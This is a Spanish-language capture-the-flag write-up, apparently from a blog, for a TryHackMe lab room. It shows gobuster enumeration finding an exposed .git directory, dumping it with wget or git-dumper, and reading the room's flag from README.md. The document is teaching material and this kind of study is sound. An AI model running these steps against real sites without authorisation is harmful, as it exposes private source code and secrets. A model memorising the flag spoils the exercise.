---
title: "Room 404"
date: 2026-07-28 09:05:00 -0400
description: "Writeup de la sala Room 404 del evento Hacker Holidays en TryHackMe. Explotación de un directorio .git expuesto para dumpear el código fuente y recuperar la flag."
categories: [TryHackMe, Hacker Holidays 2026]
tags: [Web, Git Exposure, Directory Enumeration, Gobuster, Very Easy]
---

> 📌 **Ficha Técnica**
> - **Plataforma:** TryHackMe
> - **Evento/Sala:** Hacker Holidays - Room 404
> - **Dificultad:** Very Easy
> - **Categoría:** Web
> - **Técnicas Clave:** Directory Enumeration, Git Repository Exposure, Source Code Dumping, Git Reconstruction

---

## Introducción

**Room 404** es la segunda sala del evento anual **Hacker Holidays 2026** organizado por TryHackMe. La historia nos sitúa en el ficticio **Byte Lotus Hotel**, un resort de lujo cuya plataforma de experiencia para huéspedes fue desplegada a contrarreloj por un desarrollador del turno de noche. Como era de esperarse, algo se "olvidó" en producción.

> La premisa es clara: *"Las habitaciones que nunca aparecen en el listado son las que valen la pena encontrar."*

En este writeup detallo el proceso de reconocimiento, enumeración y explotación que me permitió acceder al código fuente expuesto y recuperar la flag.

---

## Reconocimiento

### Acceso al Laboratorio

Tras iniciar la máquina objetivo en TryHackMe, se nos proporciona la siguiente dirección:

```
http://<MACHINE_IP>:8080
```

Al acceder al puerto 8080, nos encontramos con la página principal del **Byte Lotus Hotel**.

![Byte Lotus Homepage](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*placeholder.png)

La interfaz es una landing page elegante con secciones como *Rooms*, *The App*, *Concierge* y *Stay*. Sin embargo, tras explorar manualmente los enlaces, todos parecen ser placeholders sin funcionalidad real. Ningún botón redirige a endpoints funcionales.

> Ante la falta de superficie de ataque visible, es momento de pasar a la enumeración automatizada.
{: .prompt-info }

---

## Enumeración

### Descubrimiento de Directorios con Gobuster

Dado que la navegación manual no arrojó resultados, procedí a realizar un escaneo de directorios y archivos utilizando **Gobuster**.

```bash
gobuster dir   -u http://<MACHINE_IP>:8080/   -w /usr/share/wordlists/dirb/common.txt   -x html,js,php,txt,git
```

**Parámetros utilizados:**
- `-u`: URL objetivo
- `-w`: Wordlist de directorios comunes
- `-x`: Extensiones a buscar (incluyendo `.git` por precaución)

### Resultados del Escaneo

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@fireart)
===============================================================
[+] Url:                     http://10.48.151.2:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,js,php,txt,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 200) [Size: 437]
/.git/HEAD            (Status: 200) [Size: 21]
/app.js               (Status: 200) [Size: 263]

Progress: 27684 / 27690 (99.98%)
===============================================================
Finished
===============================================================
```

¡Bingo! El escaneo reveló un directorio **`.git`** expuesto públicamente.

> Un directorio `.git` expuesto en producción es una vulnerabilidad crítica. Contiene todo el historial de commits, ramas, tags y —lo más importante— el código fuente completo del proyecto.
{: .prompt-warning }

---

## Explotación

### Método 1: Descarga con wget y reconstrucción manual

El primer enfoque consiste en descargar recursivamente todo el contenido del directorio `.git/` y luego reconstruir el working tree.

#### Paso 1: Descargar el repositorio

```bash
wget --mirror -nH -P ~/Desktop/repodump http://<MACHINE_IP>:8080/.git/
```

**Opciones clave:**
- `--mirror`: Activa opciones adecuadas para espejar un sitio
- `-nH`: No crea directorios con el nombre del host
- `-P`: Directorio de destino

#### Paso 2: Navegar al directorio descargado

```bash
cd ~/Desktop/repodump
ls -la
```

**Salida:**
```
total 12
drwxr-xr-x 3 root root 4096 Aug 12 09:05 .
drwxr-xr-x 7 root root 4096 Aug 12 09:05 ..
drwxr-xr-x 8 root root 4096 Aug 12 09:05 .git
```

#### Paso 3: Reconstruir el working tree

```bash
git checkout .
```

**Salida:**
```
Updated 3 paths from the index
```

#### Paso 4: Inspeccionar los archivos recuperados

```bash
ls -la
cat README.md
```

**Salida:**
```
# Byte Lotus — Guest Experience Platform

Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.

Staging flag (remove before launch): THM{byt3_l0tus_n3v3r_f0rg3ts}
```

---

### Método 2: Uso de Git-Dumper (recomendado)

Una alternativa más elegante y automatizada es utilizar **git-dumper**, una herramienta diseñada específicamente para este tipo de escenarios.

#### Paso 1: Instalar git-dumper

```bash
pip install git-dumper
```

#### Paso 2: Dumpear el repositorio

```bash
git-dumper http://<MACHINE_IP>:8080/.git/ bytelotusrepo
```

#### Paso 3: Inspeccionar el contenido

```bash
cd bytelotusrepo
ls -la
```

**Salida:**
```
total 24
drwxr-xr-x 3 root root 4096 Aug 12 09:10 .
drwx------ 45 root root 4096 Aug 12 09:10 ..
drwxr-xr-x 7 root root 4096 Aug 12 09:10 .git
-rw-r--r-- 1 root root  238 Aug 12 09:10 README.md
-rw-r--r-- 1 root root  263 Aug 12 09:10 app.js
-rw-r--r-- 1 root root 2554 Aug 12 09:10 index.html
```

#### Paso 4: Leer la flag

```bash
cat README.md
```

**Salida:**
```
# Byte Lotus — Guest Experience Platform

Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.

Staging flag (remove before launch): THM{byt3_l0tus_n3v3r_f0rg3ts}
```

Ambos métodos conducen al mismo resultado. La diferencia radica en que `git-dumper` automatiza la reconstrucción del working tree, mientras que con `wget` debemos ejecutar `git checkout .` manualmente.

---

## Archivos Recuperados

El repositorio expuesto contenía los siguientes archivos:

| Archivo | Descripción |
|---------|-------------|
| `README.md` | Documentación interna con la **flag** |
| `app.js` | Script de la aplicación (263 bytes) |
| `index.html` | Página principal del hotel (2554 bytes) |

El archivo `app.js` y `index.html` no contenían información sensible adicional, pero el `README.md` incluía una nota explícita del desarrollador indicando que la flag debía ser removida antes del lanzamiento a producción.

---

## Flag

```
THM{byt3_l0tus_n3v3r_f0rg3ts}
```

---

## Conclusión / Retroalimentación

### Aprendizajes Clave

1. **La enumeración nunca decepciona:** Cuando la superficie de ataque visible es nula, herramientas como `gobuster` pueden revelar vectores ocultos en segundos.

2. **El peligro de exponer `.git/`:** Un repositorio Git expuesto en producción es equivalente a entregar el código fuente completo al atacante. Incluye historial de commits, credenciales hardcodeadas (en casos reales), y archivos internos.

3. **Dos herramientas, mismo objetivo:** Tanto `wget --mirror` + `git checkout` como `git-dumper` son válidos. Para flujos de trabajo rápidos, `git-dumper` es más eficiente.

### Feedback de la Sala

- **Dificultad apropiada:** Como sala "Very Easy", cumple su propósito didáctico. Es ideal para quienes están comenzando en CTFs de categoría Web.
- **Narrativa cohesiva:** El lore del Byte Lotus Hotel añade inmersión sin complicar la técnica.
- **Recomendación:** Perfecta para introducir el concepto de **Information Disclosure** y sensibilizar sobre la importancia de sanitizar archivos de control de versiones antes del despliegue.

> Si te interesa profundizar en este tipo de vulnerabilidades, te recomiendo practicar con salas como **Git Happens** o **Overpass** en TryHackMe, donde la exposición de repositorios Git juega un papel central.
{: .prompt-tip }

---

*Writeup redactado como parte de la documentación técnica del evento Hacker Holidays 2026.*
